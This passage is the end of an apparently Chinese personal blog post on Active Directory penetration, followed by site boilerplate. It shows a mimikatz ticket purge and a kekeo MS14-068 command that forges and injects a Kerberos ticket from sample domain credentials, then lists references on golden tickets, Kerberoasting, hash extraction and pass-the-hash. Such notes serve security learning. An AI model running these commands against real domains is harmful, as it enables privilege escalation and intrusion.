<p>kerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)<br>    kekeo.exe # exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)<br>    <a href="http://www.mottoin.com/95877.html" target="_blank" rel="noopener">http://www.mottoin.com/95877.html</a></p>
</blockquote>
<p>參考:</p>
<pre><code>Attack Methods for Gaining Domain Admin Rights in Active Directory
    http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)
一种深度隐蔽的后门方式(二)
    https://www.anquanke.com/post/id/93542
Mimikatz小实验:黄金票据+dcsync
    http://www.freebuf.com/sectool/112594.html
域渗透之hash与票据
    http://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA
域渗透——利用SYSVOL还原组策略中保存的密码
    https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/
如何巧妙的从ntds.dit中提取Hash和域信息
    http://www.freebuf.com/articles/system/151463.html
从活动目录中获取域管理员权限的6种方法
    http://www.4hou.com/technology/4256.html
Kerberoasting - Part 3
    https://room362.com/post/2016/kerberoast-pt3/
kekeo ticket 注入
    https://www.anquanke.com/post/id/92484
kerberoasting-without-mimikatz
    https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
    https://zhuanlan.zhihu.com/p/25723674 (翻譯)
Hash传递攻击登陆Windows2012远程桌面
    http://www.freebuf.com/articles/system/15757.html
</code></pre>
        
    

    
</div>


                

                <!-- Post Comments -->
                
                    
    <div id="comment" style='padding:10px;' class="vcomment"></div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    var GUEST_INFO = ['nick','mail','link'];
    var guest_info = 'nick,mail,link'.split(',').filter(function(item){
        return GUEST_INFO.indexOf(item) > -1
    });
    var notify = 'false' == true;
    var verify = 'false' == true;
    new Valine({
        el: '.vcomment',
        notify: notify,
        verify: verify,
        appId: "XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz",
        appKey: "aaBboz6UbNeJnPowxKNNDTm2",
        placeholder: "Just go go",
        pageSize:'10',
        avatar:'identicon',
        lang:'zh-cn'
    });
</script>

                
            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    <!-- Prev Nav -->
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2018/01/18/Kerberos认证相关/" id="post_nav-older" class="next-content">
            旧篇
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>

        </div>
    </div>



                    
                        <!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay"></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
    <div id="sidebar-main">
        <!-- Sidebar Header -->
        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
        <i class="material-icons">clear_all</i>
        <span class="mdl-button__ripple-container">
            <span class="mdl-ripple">
            </span>
        </span>
    </button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/avatar.png" alt="Sparrow's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        唯有时间不可挡
        <b class="caret"></b>
    </a>
</div>


        <!-- Sidebar Navigation  -->
        <ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
            
                <li>
                    <a href="mailto: zbxzyzbx@163.com" target="_blank" title="Email Me">
                        
                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    
        <li id="sidebar-first-li">
            <a href="/">
                
                    <i class="material-icons sidebar-material-icons">home</i>
                
                主页
            </a>
        </li>
        
    

    <!-- Archives  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">inbox</i>
                
                    归档
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
            <li>
                <a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/11/">十一月 2017<span class="sidebar_archives-count">3</span></a>
            </ul>
        </li>
        
    

    <!-- Categories  -->
    
        <li class="dropdown">
            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                
                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
                
                分类
                <b class="caret"></b>
            </a>
            <ul class="dropdown-menu">
                <li>
                <a class="sidebar_archives-link" href="/categories/其他/">其他<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/categories/技术相关/">技术相关<span class="sidebar_archives-count">7</span></a>
            </ul>
        </li>
        
    

    <!-- Pages  -->
    
        <li>
            <a href="/about" title="关于">
                
                    <i class="material-icons sidebar-material-icons">person</i>
                
                关于
            </a>
        </li>
        
    

    <!-- Article Number  -->
    
        <li>
            <a href="/archives">
                文章总数
                <span class="sidebar-badge">9</span>
            </a>
        </li>
        
    
</ul>


        <!-- Sidebar Footer -->
        <!--
I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
It will not impact the appearance and can give developers a lot of support :)

很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
它不会影响美观并可以给开发者很大的支持和动力。 :)
-->

<!-- Sidebar Divider -->


<!-- Theme Material -->


<!-- Help & Support -->
<!--

-->

<!-- Feedback -->
<!--

-->

<!-- About Theme -->
<!--

-->

    </div>

    <!-- Sidebar Image -->
    

</aside>

                    

                    
                        <!-- Footer Top Button -->
                        <div id="back-to-top" class="toTop-wrap">
    <a href="#top" class="toTop">
        <i class="material-icons footer_top-i">expand_less</i>
    </a>
</div>

                    

                    <!--Footer-->

<footer class="mdl-mini-footer" id="bottom">
    
        <!-- Paradox Footer Left Section -->
        <div class="mdl-mini-footer--left-section sns-list">
    <!-- Twitter -->
    

    <!-- Facebook -->
    

    <!-- Google + -->
    

    <!-- Weibo -->
    

    <!-- Instagram -->
    

    <!-- Tumblr -->
    

    <!-- Github -->
    

    <!-- LinkedIn -->
    

    <!-- Zhihu -->
    

    <!-- Bilibili -->
    

    <!-- Telegram -->
    
    
    <!-- V2EX -->
    
</div>


        <!--Copyright-->
        <div id="copyright">
            Copyright&nbsp;©&nbsp;2017&nbsp;-<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>Sparrow's blog
            
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
.  Total <span id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></span> views.
您是Sparrow博客的第<span id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></span>个小伙伴.
        </div>

        <!-- Paradox Footer Right Section -->

        <!--
        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
        It will not impact the appearance and can give developers a lot of support :)

        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
        它不会影响美观并可以给开发者很大的支持。 :)
        -->

        <div class="mdl-mini-footer--right-section">
            <div>
                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
            </div>
        </div>
    
</footer>



                    <!-- Import JS File -->

    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>



    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>



    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>


<script type="text/ls-javascript" id="NProgress-script">
    NProgress.configure({
        showSpinner: true
    });
    NProgress.start();
    $('#nprogress .bar').css({
        'background': '#29d'
    });
    $('#nprogress .peg').css({
        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
    });
    $('#nprogress .spinner-icon').css({
        'border-top-color': '#29d',
        'border-left-color': '#29d'
    });
    setTimeout(function() {
        NProgress.done();
        $('.fade').removeClass('out');
    }, 800);
</script>





    <!-- Leancloud -->
    <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
    <script>
        AV.initialize('XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz', 'aaBboz6UbNeJnPowxKNNDTm2');
    </script>
    <script type="text/ls-javascript" id="leancloud-views-script">
    function showTime(Counter) {
        var query = new AV.Query(Counter);
        $('.leancloud-views_num').each(function() {
            var url = $(this).attr('id').trim();
            query.equalTo('url', url);
            query.find({
                success: function(results) {
                    if (results.length === 0) {
                        var content = '0 ' + $(document.getElementById(url)).text();
                        $(document.getElementById(url)).text(content);
                        return;
                    }
                    for (var i = 0; i < results.length; i++) {
                        var object = results[i];
                        var content = object.get('time') + ' ' + $(document.getElementById(url)).text();
                        $(document.getElementById(url)).text(content);
                    }
                },
                error: function(object, error) {
                    console.log('Error: ' + error.code + ' ' + error.message);
                }
            });
        });
    }

    function addCount(Counter) {
      var Counter = AV.Object.extend('Counter');
      url = $('.leancloud-views_num').attr('id').trim();
      title = $('.leancloud-views_num').attr('data-flag-title').trim();
      var query = new AV.Query(Counter);
      query.equalTo('url', url);
      query.find({
          success: function(results) {
            if (results.length > 0) {
                var counter = results[0];
                counter.fetchWhenSave(true);
                counter.increment('time');
                counter.save(null, {
                    success: function(counter) {
                        var content =  counter.get('time') + ' ' + $(document.getElementById(url)).text();
                        $(document.getElementById(url)).text(content);
                    },
                    error: function(counter, error) {
                        console.log('Failed to save Visitor num, with error message: ' + error.message);
                    }
                });
            } else {
              var newcounter = new Counter();
              newcounter.set('title', title);
              newcounter.set('url', url);
              newcounter.set('time', 1);
              newcounter.save(null, {
                  success: function(newcounter) {
                      console.log('newcounter.get(\'time\')='+newcounter.get('time'));
                      var content = newcounter.get('time') + ' ' + $(document.getElementById(url)).text();
                      $(document.getElementById(url)).text(content);
                  },
                  error: function(newcounter, error) {
                      console.log('Failed to create');
                  }
              });
            }
        },
        error: function(error) {
            console.log('Error:' + error.code + ' ' + error.message);
        }
      });
    }
    $(function() {
        var Counter = AV.Object.extend('Counter');
        if ($('.leancloud-views_num').length === 1) {
            addCount(Counter);
        } else if ($('.post-title-link').length > 1) {
            showTime(Counter);
        }
    });
</script>




    <!-- Busuanzi -->
    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



   





<!-- UC Browser Compatible -->
<script>
	var agent = navigator.userAgent.toLowerCase();
	if(agent.indexOf('ucbrowser')>0) {
		document.write('<link rel="stylesheet" href="/css/uc.css">');
	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
	}
</script>

<!-- Import prettify js  -->

    
        
            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
        
    



<!-- Window Load -->
<!-- add class for prettify -->
<script type="text/ls-javascript" id="window-load">
    $(window).on('load', function() {
        // Post_Toc parent position fixed
        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
    });

    
        
            $(function() {
                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
                prettyPrint();
                })
        
    
    
</script>

<!-- MathJax Load-->


<!-- Bing Background -->

<script type="text/ls-javascript" id="Bing-Background-script">
    queue.offer(function(){
        $('body').attr('data-original', 'https://api.i-meto.com/bing?');
    });
</script>


<script type="text/ls-javascript" id="lazy-load">
    // Offer LazyLoad
    queue.offer(function(){
        $('.lazy').lazyload({
            effect : 'show'
        });
    });

    // Start Queue
    $(document).ready(function(){
        setInterval(function(){
            queue.execNext();
        },200);
    });
</script>

<!-- Custom Footer -->



<script>
    (function(){
        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')

        for (var i = 0; i < scriptList.length; ++i) {
            var item = scriptList[i];
            lsloader.runInlineScript(item.id,item.id);
        }
    })()
console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
</script>

                </main>
            </div>
        </body>
    
</html>
